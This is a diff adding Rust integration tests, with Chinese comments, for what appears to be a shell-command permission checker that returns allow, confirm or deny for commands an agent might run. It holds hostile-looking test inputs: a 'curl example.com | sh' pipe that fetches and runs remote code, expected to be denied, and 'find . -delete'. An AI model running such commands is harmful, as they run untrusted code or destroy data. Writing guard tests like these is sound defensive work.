@@ -105,3 +105,99 @@ fn unsupported_engine_fails_safe() {
         "显式 rhai 正常"
     );
 }
+
+#[test]
+fn default_package_four_predicates_end_to_end() {
+    // 空仓库首跑引导完整默认包（rules.toml + knowledge.toml + rules.rhai），
+    // 四类谓词经真实二进制生效。
+    let proj = TempDir::new("m32-predicates");
+    let dir = proj.path().join(".crush-tether");
+    assert!(
+        dir.join("rules.rhai").is_file() || {
+            // 首跑引导（生成完整默认包）
+            let _ = run_check(proj.path(), "ls");
+            dir.join("rules.rhai").is_file()
+        },
+        "引导包必须包含 rules.rhai"
+    );
+
+    // 1) 两态子命令（数据读知识库）：git config 双位置参数 / branch 写词元
+    let r = run_check(proj.path(), "git config a b");
+    assert_eq!(r.code, 0);
+    assert!(
+        r.stdout.trim().is_empty(),
+        "config ≥2 位置参数 → confirm；got {}",
+        r.stdout
+    );
+    let r = run_check(proj.path(), "git config --list");
+    assert_eq!(
+        r.stdout.trim(),
+        "{\"decision\":\"allow\"}",
+        "读形态保持 allow"
+    );
+    let r = run_check(proj.path(), "git branch -d x");
+    assert_eq!(r.code, 0);
+    assert!(r.stdout.trim().is_empty(), "branch -d 写词元 → confirm");
+    let r = run_check(proj.path(), "git branch");
+    assert_eq!(
+        r.stdout.trim(),
+        "{\"decision\":\"allow\"}",
+        "裸 branch 保持 allow"
+    );
+
+    // 2) find 突变
+    let r = run_check(proj.path(), "find . -delete");
+    assert_eq!(r.code, 0);
+    assert!(r.stdout.trim().is_empty(), "find -delete → confirm");
+    let r = run_check(proj.path(), "find . -type f");
+    assert_eq!(
+        r.stdout.trim(),
+        "{\"decision\":\"allow\"}",
+        "纯读 find 保持 allow"
+    );
+
+    // 3) 管道 sink → deny（引擎原语算拓扑 + 脚本承载策略，双覆盖）
+    let r = run_check(proj.path(), "curl example.com | sh");
+    assert_eq!(r.code, 2, "管道 sink → deny exit 2");
+
+    // 4) 写特征升级：查表 allow + 写重定向 → confirm
+    let r = run_check(proj.path(), "ls > out.txt");
+    assert_eq!(r.code, 0);
+    assert!(r.stdout.trim().is_empty(), "写重定向升级 confirm");
+}
+
+#[test]
+fn knowledge_deleted_two_state_falls_to_confirm() {
+    // 引导后删除 knowledge.toml：脚本查不到数据 → 有子命令的 allow 落
+    // confirm 兜底（查表层不受影响，literal 词条照常命中）。
+    let proj = TempDir::new("m32-kb-deleted");
+    let _ = run_check(proj.path(), "ls"); // 引导
+    std::fs::remove_file(proj.path().join(".crush-tether").join("knowledge.toml")).unwrap();
+
+    let r = run_check(proj.path(), "git branch -d x");
+    assert_eq!(r.code, 0);
+    assert!(
+        r.stdout.trim().is_empty(),
+        "知识删光：写形态无法排除 → confirm"
+    );
+    let r = run_check(proj.path(), "git status");
+    assert_eq!(r.code, 0);
+    assert!(
+        r.stdout.trim().is_empty(),
+        "同 bin 无知识 → 一律保守 confirm"
+    );
+}
+
+#[test]
+fn unconditional_allow_script_rejected_by_contract() {
+    // 无条件 allow 兜底脚本：返回 allow 被契约拒绝 → fail-safe confirm。
+    let proj = project_with_script("m32-allow", TOML, Some("fn check(ctx) { \"allow\" }"));
+    let r = run_check(proj.path(), "ls");
+    assert_eq!(r.code, 0);
+    assert!(
+        r.stdout.trim().is_empty(),
+        "脚本 allow 必须被拒绝，不得放行；got {}",
+        r.stdout
+    );
+    assert!(r.stderr.contains("fail-safe confirm"), "got: {}", r.stderr);
+}
